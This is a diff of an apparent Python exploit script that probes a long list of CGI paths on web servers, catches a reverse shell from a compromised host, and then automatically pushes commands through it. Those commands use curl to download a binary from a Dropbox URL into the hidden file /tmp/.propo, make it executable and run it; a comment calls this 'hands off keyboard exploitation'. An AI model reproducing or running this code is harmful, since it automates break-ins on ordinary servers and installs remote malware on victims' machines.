@@ -84,7 +84,37 @@ else:
 try:
 	pages = args['pages'].split(",")
 except:
-	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]
+	pages = ["/cgi-sys/entropysearch.cgi",
+			"/cgi-sys/defaultwebpage.cgi",
+			"/cgi-mod/index.cgi",
+			"/cgi-bin/test.cgi",
+			"/cgi-bin-sdb/printenv",
+			"/cgi-bin/bash",
+			"/cgi-bin/contact.cgi",
+			"/cgi-bin/defaultwebpage.cgi",
+			"/cgi-bin/env.cgi",
+			"/cgi-bin/fire.cgi",
+			"/cgi-bin/forum.cgi",
+			"/cgi-bin/hello.cgi",
+			"/cgi-bin/index.cgi",
+			"/cgi-bin/login.cgi",
+			"/cgi-bin/main.cgi",
+			"/cgi-bin/meme.cgi",
+			"/cgi-bin/php",
+			"/cgi-bin/php4",
+			"/cgi-bin/php5",
+			"/cgi-bin/php5-cli",
+			"/cgi-bin/recent.cgi",
+			"/cgi-bin/sat-ir-web.pl",
+			"/cgi-bin/status",
+			"/cgi-bin/test-cgi",
+			"/cgi-bin/test.cgi",
+			"/cgi-bin/test-cgi.pl",
+			"/cgi-bin/test.sh",
+			"/cgi-bin/tools/tools.pl",
+			"/cgi-sys/php5",
+			"/phppath/cgi_wrapper",
+			"/phppath/php",]
 
 if args['payload'] == 'reverse':
 	serversocket = socket(AF_INET, SOCK_STREAM)
@@ -106,18 +136,16 @@ while True:
 		clientsocket, clientaddr = serversocket.accept()
 		print("[!] Successfully exploited")
 		print(f"[!] Incoming connection from {clientaddr[0]}")
+		# Hands off keyboard exploitation
 		stop = True
 		clientsocket.settimeout(100)
 		# These links may change as we update the files
 		print("[-] Obtaining propo...")
 		clientsocket.sendall("curl https://uc12a87c04a246091c04d4551b0a.dl.dropboxusercontent.com/cd/0/get/Av2rnc6yg7Qgjl9VMEhclOFWgphJHkh0qTTbfWc5c2UOW3Od1mXMKutT6z6xzPV4F4XWrYuN55blSuFvjDkdpD6Z5poIKSp1yDf1DDHahNGYgQtmmVgoWuSotjSmKsN0JtE/file --output /tmp/.propo --silent\n".encode())
 		time.sleep(5)
-		# data = clientsocket.recv(buff)
-		# print(data.decode())
 		print("[-] Changing propo file mode...")
 		clientsocket.sendall("chmod +x /tmp/.propo\n".encode())
 		time.sleep(1)
-		# data = clientsocket.recv(buff)
 		print("[-] Checking existence and executability of propo...")
 		clientsocket.sendall("ls /tmp -al | grep .propo\n".encode())
 		time.sleep(1)
@@ -129,15 +157,7 @@ while True:
 			clientsocket.sendall("/tmp/.propo\n".encode())
 			clientsocket.close()
 			sys.exit(0)
-		# while True:
-		# 	reply = input(f"{clientaddr[0]}> ")
-		# 	clientsocket.sendall(f"{reply}\n".encode())
-		# 	try:
-		# 		data = clientsocket.recv(buff)
-		# 		print(data.decode())
-		# 	except:
-		# 		pass
-
+	# Bind shell is less stable, so we won't implement for it
 	if args['payload'] == 'bind':
 		try:
 			serversocket = socket(AF_INET, SOCK_STREAM)
